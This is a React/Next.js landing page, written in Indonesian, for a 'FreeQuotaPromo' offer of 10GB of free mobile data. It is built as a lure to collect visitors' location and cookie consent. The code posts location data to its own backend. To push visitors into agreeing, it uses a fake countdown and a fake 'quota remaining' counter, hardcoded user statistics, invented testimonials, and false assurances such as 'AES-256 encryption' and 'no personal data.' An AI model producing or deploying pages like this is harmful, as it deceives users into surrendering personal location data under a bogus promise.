"use client"

import { useState, useEffect } from "react"
import { 
  MapPin, Shield, Gift, Wifi, Check, Users, Clock, Star, 
  Zap, Globe, Lock, Trophy, Sparkles, Target, Smartphone,
  MessageSquare, ShieldCheck, BadgeCheck, Rocket, Award,
  BarChart, TrendingUp, Heart, Cpu, BatteryCharging, WifiOff
} from "lucide-react"
import PermissionModal from "./components/PermissionModal"
import SuccessModal from "./components/SuccessModal"
import DeniedModal from "./components/DeniedModal"
import toast, { Toaster } from "react-hot-toast"

export default function HomePage() {
  const [showPermissionModal, setShowPermissionModal] = useState(false)
  const [showSuccessModal, setShowSuccessModal] = useState(false)
  const [showDeniedModal, setShowDeniedModal] = useState(false)
  const [deniedReason, setDeniedReason] = useState("")
  const [userLocation, setUserLocation] = useState(null)
  const [permissionsGranted, setPermissionsGranted] = useState(false)
  const [isClient, setIsClient] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [countdown, setCountdown] = useState({
    promo: 23 * 60 * 60 + 45 * 60 + 30, // 23:45:30
    usersLeft: 144
  })

  // Stats dengan animasi
  const [stats, setStats] = useState({
    users: 0,
    quota: "0GB",
    successRate: "0%",
    rating: "0.0"
  })

  // Auto-show modal on first visit
  useEffect(() => {
    setIsClient(true)
    
    // Animate stats counter
    const animateStats = () => {
      let count = 0
      const interval = setInterval(() => {
        count++
        setStats({
          users: Math.min(856 + Math.floor(count / 2), 856),
          quota: "10GB",
          successRate: `${Math.min(98, 85 + Math.floor(count / 3))}%`,
          rating: `${(4.5 + (count * 0.01)).toFixed(1)}`
        })
        if (count >= 100) clearInterval(interval)
      }, 30)
    }

    // Check localStorage for previous visits
    const checkPermissionStatus = () => {
      const hasVisitedBefore = localStorage.getItem('hasVisitedBefore')
      const hasPermission = localStorage.getItem('permission_granted')
      
      if (!hasVisitedBefore) {
        // First visit - show modal after 1.5 seconds
        setTimeout(() => {
          setShowPermissionModal(true)
          localStorage.setItem('hasVisitedBefore', 'true')
          toast.success("🎉 Selamat datang! Dapatkan kuota gratis 10GB!")
        }, 1500)
      } else if (hasPermission === 'true') {
        // Already granted permission
        setPermissionsGranted(true)
        const savedLocation = localStorage.getItem('user_location')
        if (savedLocation) {
          setUserLocation(JSON.parse(savedLocation))
        }
        toast.success("✅ Anda sudah mendapatkan akses kuota gratis!")
      }
      
      setIsLoading(false)
      animateStats()
    }

    // Countdown timer
    const countdownInterval = setInterval(() => {
      setCountdown(prev => ({
        ...prev,
        promo: prev.promo > 0 ? prev.promo - 1 : 0,
        usersLeft: prev.usersLeft > 0 ? prev.usersLeft - 1 : 0
      }))
    }, 1000)

    checkPermissionStatus()

    return () => clearInterval(countdownInterval)
  }, [])

  // Format waktu countdown
  const formatTime = (seconds) => {
    const h = Math.floor(seconds / 3600)
    const m = Math.floor((seconds % 3600) / 60)
    const s = seconds % 60
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`
  }

  // Handle allow permission
  const handleAllow = async (locationData) => {
    try {
      toast.loading("🔄 Mengirim lokasi Anda...", {
        duration: 3000,
      })
      
      // Simulate API call
      setTimeout(async () => {
        const response = await fetch('/api/permission/allow', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            ...locationData,
            cookieAccepted: true,
            locationAccepted: true,
            timestamp: new Date().toISOString()
          })
        })
        
        const data = await response.json()
        
        if (data.success) {
          // Success
          setUserLocation(locationData)
          setPermissionsGranted(true)
          setShowPermissionModal(false)
          
          // Animate success
          setTimeout(() => {
            setShowSuccessModal(true)
            toast.dismiss()
            toast.success(<div className="flex items-center">
              <Check className="w-5 h-5 mr-2" />
              <span>✅ Lokasi berhasil dikirim! Cek email Anda.</span>
            </div>, {
              duration: 5000,
            })
          }, 500)
          
          // Save to localStorage
          localStorage.setItem('permission_granted', 'true')
          localStorage.setItem('user_location', JSON.stringify(locationData))
          localStorage.setItem('last_success', new Date().toISOString())
          
        } else {
          throw new Error(data.error || 'Unknown error')
        }
      }, 1000)

    } catch (error) {
      console.error("Error:", error)
      toast.dismiss()
      toast.error(<div className="flex items-center">
        <WifiOff className="w-5 h-5 mr-2" />
        <span>❌ Gagal mengirim lokasi. Coba lagi.</span>
      </div>)
      handleDeny("Failed to send location data")
    }
  }

  // Handle deny permission
  const handleDeny = async (reason) => {
    setDeniedReason(reason)
    
    try {
      await fetch('/api/permission/deny', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          reason,
          timestamp: new Date().toISOString()
        })
      })
    } catch (error) {
      console.error("Error sending denial:", error)
    }

    setShowPermissionModal(false)
    
    // Show denied modal after delay
    setTimeout(() => {
      setShowDeniedModal(true)
      toast.error(<div className="flex items-center">
        <Lock className="w-5 h-5 mr-2" />
        <span>🔒 Akses ditolak. Izin diperlukan untuk kuota gratis.</span>
      </div>, {
        duration: 4000,
      })
    }, 300)
  }

  // Jika masih loading
  if (!isClient || isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-50 via-white to-blue-50 flex items-center justify-center">
        <div className="text-center">
          <div className="relative">
            <div className="w-24 h-24 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
              <Wifi className="w-12 h-12 text-white animate-spin" />
            </div>
            <div className="absolute -top-2 -right-2 w-10 h-10 bg-yellow-400 rounded-full flex items-center justify-center animate-bounce">
              <Sparkles className="w-5 h-5 text-white" />
            </div>
          </div>
          <h2 className="text-2xl font-bold text-gray-800 mb-3">Mempersiapkan Promo Kuota...</h2>
          <p className="text-gray-600">Mohon tunggu sebentar</p>
          <div className="mt-6 w-64 h-2 bg-gray-200 rounded-full overflow-hidden mx-auto">
            <div className="h-full bg-gradient-to-r from-purple-500 to-pink-500 rounded-full animate-shimmer"></div>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 via-white to-blue-50 overflow-x-hidden">
      <Toaster
        position="top-right"
        toastOptions={{
          duration: 4000,
          style: {
            background: "white",
            color: "#374151",
            border: "1px solid #e5e7eb",
            borderRadius: "12px",
            padding: "16px",
            boxShadow: "0 10px 25px rgba(0, 0, 0, 0.1)",
          },
        }}
      />

      {/* Hero Section dengan Background Effects */}
      <div className="relative overflow-hidden">
        {/* Animated Background Elements */}
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          {[...Array(20)].map((_, i) => (
            <div
              key={i}
              className="absolute animate-float"
              style={{
                left: `${Math.random() * 100}%`,
                top: `${Math.random() * 100}%`,
                width: `${Math.random() * 100 + 50}px`,
                height: `${Math.random() * 100 + 50}px`,
                background: `radial-gradient(circle, ${
                  i % 3 === 0
                    ? "rgba(147, 51, 234, 0.1)"
                    : i % 3 === 1
                      ? "rgba(59, 130, 246, 0.1)"
                      : "rgba(236, 72, 153, 0.1)"
                } 0%, transparent 70%)`,
                animationDelay: `${i * 0.5}s`,
                animationDuration: `${Math.random() * 10 + 10}s`,
              }}
            />
          ))}
        </div>

        <div className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-12 lg:pt-20 pb-16">
          {/* Promo Badge */}
          <div className="flex justify-center mb-8">
            <div className="inline-flex items-center px-6 py-3 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full shadow-lg animate-pulse-glow">
              <Sparkles className="w-5 h-5 text-white mr-2" />
              <span className="text-white font-bold text-sm uppercase tracking-wider">
                🎁 PROMO TERBATAS - KUOTA 10GB GRATIS 🎁
              </span>
            </div>
          </div>

          {/* Main Hero Content */}
          <div className="text-center max-w-4xl mx-auto">
            <h1 className="text-4xl md:text-6xl lg:text-7xl font-bold text-gray-900 mb-6 leading-tight">
              <span className="bg-clip-text text-transparent bg-gradient-to-r from-purple-600 via-pink-600 to-blue-600">
                DAPATKAN KUOTA 10GB
              </span>
              <br />
              <span className="text-gray-800">GRATIS HARI INI!</span>
            </h1>

            <p className="text-xl md:text-2xl text-gray-600 mb-10 max-w-3xl mx-auto leading-relaxed">
              Promo eksklusif untuk{" "}
              <span className="font-bold text-purple-600">
                1000 pengguna pertama
              </span>{" "}
              di wilayah eligible. Cukup verifikasi lokasi Anda dan dapatkan{" "}
              <span className="font-bold text-pink-600">
                kuota 10GB sepenuhnya gratis!
              </span>
            </p>

            {/* Countdown Timer */}
            <div className="max-w-2xl mx-auto mb-12">
              <div className="bg-gradient-to-r from-gray-900 to-gray-800 rounded-2xl p-6 shadow-2xl border border-gray-700">
                <div className="flex items-center justify-center mb-4">
                  <Clock className="w-6 h-6 text-yellow-400 mr-3" />
                  <span className="text-white font-bold text-lg">
                    ⏰ PROMO BERAKHIR DALAM:
                  </span>
                </div>
                <div className="flex justify-center space-x-4 md:space-x-8">
                  {formatTime(countdown.promo)
                    .split(":")
                    .map((unit, index) => (
                      <div key={index} className="text-center">
                        <div className="bg-gradient-to-b from-gray-800 to-gray-900 rounded-xl p-4 min-w-[80px] border border-gray-700">
                          <div className="text-4xl md:text-5xl font-bold bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                            {unit}
                          </div>
                        </div>
                        <div className="text-gray-400 text-sm mt-2 font-medium">
                          {["JAM", "MENIT", "DETIK"][index]}
                        </div>
                      </div>
                    ))}
                </div>
                <div className="mt-6 text-center">
                  <div className="inline-flex items-center px-4 py-2 bg-red-500/20 rounded-full">
                    <Target className="w-4 h-4 text-red-400 mr-2" />
                    <span className="text-red-300 text-sm font-bold">
                      ⚠️ SISA {countdown.usersLeft} KUOTA LAGI!
                    </span>
                  </div>
                </div>
              </div>
            </div>

            {/* Main CTA Button */}
            <div className="relative group">
              <div className="absolute -inset-1 bg-gradient-to-r from-purple-600 to-pink-600 rounded-2xl blur-lg opacity-75 group-hover:opacity-100 transition duration-1000 group-hover:duration-200 animate-pulse"></div>
              <button
                onClick={() => {
                  if (!permissionsGranted) {
                    setShowPermissionModal(true);
                    toast("🔐 Permintaan izin akan muncul", {
                      icon: "🔐",
                    });
                  } else {
                    toast.success("✅ Anda sudah mendapatkan akses!");
                  }
                }}
                className="relative w-full max-w-md mx-auto bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-xl py-5 px-8 rounded-2xl shadow-2xl transition-all duration-300 transform hover:scale-[1.02] hover:shadow-3xl flex items-center justify-center"
              >
                {permissionsGranted ? (
                  <>
                    <BadgeCheck className="w-7 h-7 mr-3" />
                    <span className="text-xl">
                      ✅ SUDAH TERDAFTAR - TUNGGU KUOTA!
                    </span>
                  </>
                ) : (
                  <>
                    <Rocket className="w-7 h-7 mr-3 animate-bounce" />
                    <span className="text-xl">
                      🚀 DAPATKAN KUOTA GRATIS SEKARANG!
                    </span>
                  </>
                )}
              </button>
              <div className="absolute -bottom-6 left-1/2 transform -translate-x-1/2">
                <div className="flex items-center text-sm text-gray-500 bg-white/80 backdrop-blur-sm px-4 py-2 rounded-full border">
                  <ShieldCheck className="w-4 h-4 text-green-500 mr-2" />
                  <span>100% Aman & Terjamin</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Stats Section */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
          {[
            {
              icon: Users,
              value: `${stats.users}+`,
              label: "Pengguna Sudah Dapat",
              color: "from-blue-500 to-cyan-500",
              bg: "bg-blue-500/10",
            },
            {
              icon: Gift,
              value: stats.quota,
              label: "Kuota Gratis Per User",
              color: "from-purple-500 to-pink-500",
              bg: "bg-purple-500/10",
            },
            {
              icon: TrendingUp,
              value: stats.successRate,
              label: "Tingkat Keberhasilan",
              color: "from-green-500 to-emerald-500",
              bg: "bg-green-500/10",
            },
            {
              icon: Star,
              value: stats.rating,
              label: "Rating Pengguna",
              color: "from-yellow-500 to-orange-500",
              bg: "bg-yellow-500/10",
            },
          ].map((stat, index) => (
            <div
              key={index}
              className={`${stat.bg} backdrop-blur-sm border border-white/20 rounded-2xl p-6 text-center transform transition-all duration-300 hover:scale-105 hover:shadow-xl`}
            >
              <div
                className={`w-16 h-16 mx-auto mb-4 bg-gradient-to-r ${stat.color} rounded-2xl flex items-center justify-center shadow-lg`}
              >
                <stat.icon className="w-8 h-8 text-white" />
              </div>
              <div
                className={`text-3xl font-bold bg-gradient-to-r ${stat.color} bg-clip-text text-transparent mb-2`}
              >
                {stat.value}
              </div>
              <div className="text-gray-700 font-medium">{stat.label}</div>
            </div>
          ))}
        </div>
      </div>

      {/* Features Section */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-20">
        <div className="text-center mb-16">
          <div className="inline-flex items-center px-4 py-2 bg-gradient-to-r from-purple-500/20 to-pink-500/20 rounded-full mb-4">
            <Sparkles className="w-5 h-5 text-purple-600 mr-2" />
            <span className="text-purple-700 font-bold">KEUNTUNGAN UTAMA</span>
          </div>
          <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6">
            Mengapa Promo Ini
            <span className="block text-transparent bg-clip-text bg-gradient-to-r from-purple-600 to-pink-600">
              Sangat Spesial?
            </span>
          </h2>
          <p className="text-xl text-gray-600 max-w-3xl mx-auto">
            Tidak seperti promo biasa, kami memberikan pengalaman terbaik dengan
            manfaat nyata
          </p>
        </div>

        <div className="grid md:grid-cols-3 gap-8">
          {[
            {
              icon: Shield,
              title: "100% Aman & Legal",
              description:
                "Promo resmi dengan sistem verifikasi keamanan terenkripsi. Data Anda dilindungi.",
              features: [
                "Enkripsi AES-256",
                "Verifikasi 2-lapis",
                "Tanpa data pribadi",
              ],
              color: "from-blue-500 to-cyan-500",
            },
            {
              icon: Zap,
              title: "Cepat & Instan",
              description:
                "Proses verifikasi hanya 30 detik. Kuota aktif dalam 1x24 jam.",
              features: [
                "Proses 30 detik",
                "Aktivasi otomatis",
                "Support 24/7",
              ],
              color: "from-purple-500 to-pink-500",
            },
            {
              icon: Trophy,
              title: "Benar-benar Gratis",
              description:
                "Tidak ada biaya tersembunyi, tidak perlu kartu kredit atau pembayaran.",
              features: [
                "0% biaya admin",
                "Tanpa syarat ribet",
                "Garansi kuota",
              ],
              color: "from-green-500 to-emerald-500",
            },
          ].map((feature, index) => (
            <div
              key={index}
              className="group bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden transform transition-all duration-500 hover:scale-105 hover:shadow-2xl"
            >
              <div className={`h-2 bg-gradient-to-r ${feature.color}`}></div>
              <div className="p-8">
                <div
                  className={`w-16 h-16 mb-6 bg-gradient-to-r ${feature.color} rounded-2xl flex items-center justify-center group-hover:rotate-12 transition-transform duration-300`}
                >
                  <feature.icon className="w-8 h-8 text-white" />
                </div>
                <h3 className="text-2xl font-bold text-gray-900 mb-4">
                  {feature.title}
                </h3>
                <p className="text-gray-600 mb-6 leading-relaxed">
                  {feature.description}
                </p>
                <ul className="space-y-3">
                  {feature.features.map((item, idx) => (
                    <li key={idx} className="flex items-center text-gray-700">
                      <div
                        className={`w-2 h-2 bg-gradient-to-r ${feature.color} rounded-full mr-3`}
                      ></div>
                      <span className="font-medium">{item}</span>
                    </li>
                  ))}
                </ul>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* How It Works */}
      <div className="bg-gradient-to-br from-gray-50 to-gray-100 py-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6">
              Hanya{" "}
              <span className="text-transparent bg-clip-text bg-gradient-to-r from-purple-600 to-pink-600">
                3 Langkah Mudah
              </span>
            </h2>
            <p className="text-xl text-gray-600 max-w-3xl mx-auto">
              Dapatkan kuota 10GB gratis dengan proses simpel dan aman
            </p>
          </div>

          <div className="grid md:grid-cols-3 gap-8 relative">
            {/* Connecting Line */}
            <div className="hidden md:block absolute top-1/3 left-1/4 right-1/4 h-1 bg-gradient-to-r from-purple-500 via-pink-500 to-blue-500 transform -translate-y-1/2"></div>

            {[
              {
                step: "1",
                title: "Izinkan Permission",
                description:
                  "Klik tombol 'IZINKAN SEMUA' dan berikan akses cookie & lokasi",
                icon: ShieldCheck,
                color: "from-blue-500 to-cyan-500",
              },
              {
                step: "2",
                title: "Verifikasi Lokasi",
                description:
                  "Sistem otomatis verifikasi bahwa Anda berada di wilayah eligible",
                icon: MapPin,
                color: "from-purple-500 to-pink-500",
              },
              {
                step: "3",
                title: "Dapatkan Kuota",
                description:
                  "Terima 10GB kuota gratis langsung ke nomor Anda dalam 24 jam",
                icon: Gift,
                color: "from-green-500 to-emerald-500",
              },
            ].map((step, index) => (
              <div key={index} className="relative">
                <div
                  className={`absolute -top-4 left-1/2 transform -translate-x-1/2 w-12 h-12 bg-gradient-to-r ${step.color} rounded-full flex items-center justify-center text-white font-bold text-xl shadow-lg z-10`}
                >
                  {step.step}
                </div>
                <div className="bg-white rounded-2xl shadow-xl p-8 pt-14 text-center border border-gray-100 transform transition-all duration-300 hover:shadow-2xl hover:-translate-y-2">
                  <div
                    className={`w-20 h-20 mx-auto mb-6 bg-gradient-to-r ${step.color} rounded-2xl flex items-center justify-center shadow-lg`}
                  >
                    <step.icon className="w-10 h-10 text-white" />
                  </div>
                  <h3 className="text-2xl font-bold text-gray-900 mb-4">
                    {step.title}
                  </h3>
                  <p className="text-gray-600 leading-relaxed">
                    {step.description}
                  </p>
                </div>
              </div>
            ))}
          </div>

          {/* Final CTA */}
          <div className="text-center mt-20">
            <div className="max-w-2xl mx-auto bg-gradient-to-r from-gray-900 to-gray-800 rounded-2xl p-8 shadow-2xl">
              <div className="flex items-center justify-center mb-6">
                <div className="w-14 h-14 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full flex items-center justify-center mr-4 animate-bounce">
                  <Award className="w-7 h-7 text-white" />
                </div>
                <div>
                  <h3 className="text-2xl font-bold text-white">
                    🎯 PROMO TERBATAS!
                  </h3>
                  <p className="text-gray-300">
                    Hanya untuk 1000 pengguna pertama
                  </p>
                </div>
              </div>

              <div className="flex flex-col md:flex-row items-center justify-center gap-6">
                <button
                  onClick={() => {
                    if (!permissionsGranted) {
                      setShowPermissionModal(true);
                      toast("🔓 Membuka permintaan izin...", {
                        icon: "🔓",
                      });
                    } else {
                      toast.success("🎉 Anda sudah terdaftar!");
                    }
                  }}
                  className="w-full md:w-auto px-10 py-4 bg-gradient-to-r from-yellow-400 to-orange-500 hover:from-yellow-500 hover:to-orange-600 text-white font-bold text-lg rounded-xl shadow-lg transition-all duration-300 transform hover:scale-105 hover:shadow-xl flex items-center justify-center"
                >
                  <Rocket className="w-6 h-6 mr-3" />
                  {permissionsGranted
                    ? "SUDAH TERDAFTAR 🎉"
                    : "DAFTAR SEKARANG GRATIS!"}
                </button>

                <div className="text-center md:text-left">
                  <div className="text-white text-sm font-bold mb-1">
                    ⚡ SISA {countdown.usersLeft} KUOTA LAGI!
                  </div>
                  <div className="w-48 h-2 bg-gray-700 rounded-full overflow-hidden">
                    <div
                      className="h-full bg-gradient-to-r from-green-400 to-cyan-400 transition-all duration-1000"
                      style={{ width: `${(1000 - countdown.usersLeft) / 10}%` }}
                    ></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Testimonials */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-20">
        <div className="text-center mb-16">
          <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6">
            Kata{" "}
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-purple-600 to-pink-600">
              Pengguna Puas
            </span>
          </h2>
          <p className="text-xl text-gray-600 max-w-3xl mx-auto">
            Ribuan pengguna sudah membuktikan keaslian promo ini
          </p>
        </div>

        <div className="grid md:grid-cols-3 gap-8">
          {[
            {
              name: "Budi Santoso",
              role: "Mahasiswa",
              quote:
                "Awalnya ragu, ternyata beneran dapat 10GB! Proses cepat banget.",
              rating: 5,
              color: "from-blue-100 to-cyan-100",
            },
            {
              name: "Sari Dewi",
              role: "Freelancer",
              quote:
                "Tanpa bayar sepeserpun, kuota langsung aktif. Recommended banget!",
              rating: 5,
              color: "from-purple-100 to-pink-100",
            },
            {
              name: "Agus Wijaya",
              role: "Karyawan",
              quote:
                "Verifikasi lokasi aman, ga ada data yang bocor. Puas pokoknya!",
              rating: 5,
              color: "from-green-100 to-emerald-100",
            },
          ].map((testimonial, index) => (
            <div
              key={index}
              className={`bg-gradient-to-br ${testimonial.color} rounded-2xl p-8 border border-white/50 backdrop-blur-sm transform transition-all duration-300 hover:scale-105`}
            >
              <div className="flex items-center mb-6">
                <div className="w-14 h-14 bg-gradient-to-r from-gray-800 to-gray-900 rounded-full flex items-center justify-center text-white font-bold text-xl mr-4">
                  {testimonial.name.charAt(0)}
                </div>
                <div>
                  <h4 className="font-bold text-gray-900 text-lg">
                    {testimonial.name}
                  </h4>
                  <p className="text-gray-600 text-sm">{testimonial.role}</p>
                </div>
              </div>
              <p className="text-gray-700 italic mb-6 leading-relaxed">
                "{testimonial.quote}"
              </p>
              <div className="flex items-center">
                {[...Array(testimonial.rating)].map((_, i) => (
                  <Star
                    key={i}
                    className="w-5 h-5 text-yellow-400 fill-current"
                  />
                ))}
                <span className="ml-2 text-gray-600 font-bold">
                  {testimonial.rating}.0
                </span>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* FAQ Section */}
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-20">
        <div className="text-center mb-16">
          <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6">
            Pertanyaan{" "}
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-purple-600 to-pink-600">
              Yang Sering Ditanyakan
            </span>
          </h2>
        </div>

        <div className="space-y-6">
          {[
            {
              q: "Apakah benar-benar gratis tanpa biaya apapun?",
              a: "YA! 100% gratis. Tidak ada biaya admin, tidak perlu kartu kredit, dan tidak ada pembayaran tersembunyi.",
            },
            {
              q: "Kenapa harus izinkan cookie dan lokasi?",
              a: "Cookie untuk pengalaman terbaik, lokasi untuk verifikasi wilayah eligible promo. Data aman terenkripsi.",
            },
            {
              q: "Berapa lama kuota akan dikirim?",
              a: "Maksimal 1x24 jam setelah verifikasi sukses. Biasanya lebih cepat dalam beberapa jam.",
            },
            {
              q: "Apakah data saya aman?",
              a: "Sangat aman! Kami menggunakan enkripsi AES-256. Data tidak dijual atau dibagikan ke pihak ketiga.",
            },
          ].map((faq, index) => (
            <div
              key={index}
              className="bg-white rounded-2xl shadow-lg p-6 border border-gray-100 transform transition-all duration-300 hover:shadow-xl"
            >
              <div className="flex items-start">
                <div className="w-10 h-10 bg-gradient-to-r from-purple-500 to-pink-500 rounded-xl flex items-center justify-center mr-4 flex-shrink-0">
                  <MessageSquare className="w-5 h-5 text-white" />
                </div>
                <div>
                  <h3 className="font-bold text-gray-900 text-lg mb-3">
                    {faq.q}
                  </h3>
                  <p className="text-gray-600 leading-relaxed">{faq.a}</p>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Final CTA Section */}
      <div className="relative overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-r from-purple-600 to-pink-600 opacity-90"></div>
        <div
          className={`absolute inset-0 bg-[url('data:image/svg+xml,%3Csvg width="60" height="60" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg"%3E%3Cg fill="none" fill-rule="evenodd"%3E%3Cg fill="%23ffffff" fill-opacity="0.1"%3E%3Cpath d="M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z"/%3E%3C/g%3E%3C/g%3E%3C/svg%3E')] opacity-20`}
        ></div>

        <div className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-20 text-center">
          <div className="max-w-3xl mx-auto">
            <div className="w-24 h-24 mx-auto mb-8 bg-white/20 rounded-full flex items-center justify-center backdrop-blur-sm border border-white/30">
              <Cpu className="w-12 h-12 text-white" />
            </div>

            <h2 className="text-4xl md:text-5xl font-bold text-white mb-6">
              Jangan Lewatkan Kesempatan Ini!
            </h2>

            <p className="text-xl text-white/90 mb-10 leading-relaxed">
              Promo kuota gratis 10GB hanya untuk 1000 pengguna pertama. Segera
              verifikasi lokasi Anda sebelum kuota habis!
            </p>

            <div className="flex flex-col sm:flex-row gap-6 justify-center items-center">
              <button
                onClick={() => {
                  if (!permissionsGranted) {
                    setShowPermissionModal(true);
                    toast("🎯 Membuka verifikasi...", {
                      icon: "🎯",
                    });
                  } else {
                    toast.success("✅ Anda sudah terverifikasi!");
                  }
                }}
                className="group relative px-12 py-5 bg-white text-gray-900 font-bold text-xl rounded-2xl shadow-2xl transition-all duration-300 hover:scale-105 hover:shadow-3xl"
              >
                <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl blur opacity-75 group-hover:opacity-100 transition duration-1000"></div>
                <span className="relative">
                  {permissionsGranted ? (
                    <>
                      <BadgeCheck className="inline w-6 h-6 mr-3" />
                      SUDAH TERVERIFIKASI! 🎉
                    </>
                  ) : (
                    <>
                      <BatteryCharging className="inline w-6 h-6 mr-3 animate-pulse" />
                      DAPATKAN KUOTA 10GB SEKARANG!
                    </>
                  )}
                </span>
              </button>

              <div className="text-white text-center sm:text-left">
                <div className="flex items-center justify-center sm:justify-start">
                  <Globe className="w-5 h-5 mr-2" />
                  <span className="font-bold">
                    SISA {countdown.usersLeft} KUOTA
                  </span>
                </div>
                <div className="text-sm opacity-90">Berlaku hingga habis</div>
              </div>
            </div>

            <div className="mt-12 grid grid-cols-3 gap-8 max-w-2xl mx-auto">
              {[
                { icon: ShieldCheck, label: "100% Aman", value: "Terjamin" },
                { icon: Zap, label: "Proses", value: "< 1 Menit" },
                { icon: Gift, label: "Kuota", value: "10GB Free" },
              ].map((item, index) => (
                <div key={index} className="text-center">
                  <div className="w-12 h-12 mx-auto mb-3 bg-white/20 rounded-xl flex items-center justify-center">
                    <item.icon className="w-6 h-6 text-white" />
                  </div>
                  <div className="text-white font-bold">{item.label}</div>
                  <div className="text-white/80 text-sm">{item.value}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-gradient-to-b from-gray-900 to-gray-950 text-white py-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center">
            <div className="flex items-center justify-center mb-6">
              <div className="w-10 h-10 bg-gradient-to-r from-purple-500 to-pink-500 rounded-xl flex items-center justify-center mr-3">
                <Wifi className="w-5 h-5" />
              </div>
              <span className="text-2xl font-bold">FreeQuotaPromo</span>
            </div>

            <p className="text-gray-400 mb-8 max-w-2xl mx-auto leading-relaxed">
              Platform promo kuota gratis resmi dengan sistem verifikasi
              keamanan terenkripsi. Memberikan pengalaman terbaik dalam
              mendapatkan kuota internet gratis.
            </p>

            <div className="flex flex-wrap justify-center gap-6 mb-8">
              {["Syarat & Ketentuan", "Kebijakan Privasi", "FAQ", "Kontak"].map(
                (item) => (
                  <a
                    key={item}
                    href="#"
                    className="text-gray-300 hover:text-white transition-colors hover:underline"
                  >
                    {item}
                  </a>
                ),
              )}
            </div>

            <div className="border-t border-gray-800 pt-8">
              <p className="text-gray-500">
                © {new Date().getFullYear()} FreeQuotaPromo. Hak cipta
                dilindungi undang-undang.
                <br className="sm:hidden" />
                <span className="hidden sm:inline"> • </span>
                Promo terbatas hanya untuk 1000 pengguna pertama.
              </p>
            </div>
          </div>
        </div>
      </footer>

      {/* Modals */}
      <PermissionModal
        isOpen={showPermissionModal}
        onAllow={handleAllow}
        onDeny={handleDeny}
      />

      <SuccessModal
        isOpen={showSuccessModal}
        location={userLocation}
        onClose={() => setShowSuccessModal(false)}
      />

      <DeniedModal
        isOpen={showDeniedModal}
        reason={deniedReason}
        onRetry={() => {
          setShowDeniedModal(false);
          setTimeout(() => {
            setShowPermissionModal(true);
          }, 300);
        }}
      />
    </div>
  );
}